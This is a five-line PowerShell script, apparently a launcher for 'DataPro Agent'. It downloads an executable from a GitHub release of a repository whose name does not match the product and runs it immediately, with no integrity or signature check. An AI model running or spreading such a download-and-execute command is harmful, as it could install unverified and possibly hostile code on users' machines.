$ErrorActionPreference = "Stop"
$url = "https://github.com/ManVats0/TheGod-sToolPython/releases/latest/download/datapro-agent.exe"
Invoke-WebRequest -Uri $url -OutFile "datapro-agent.exe"
Write-Host "Starting DataPro Agent..."
.\datapro-agent.exe
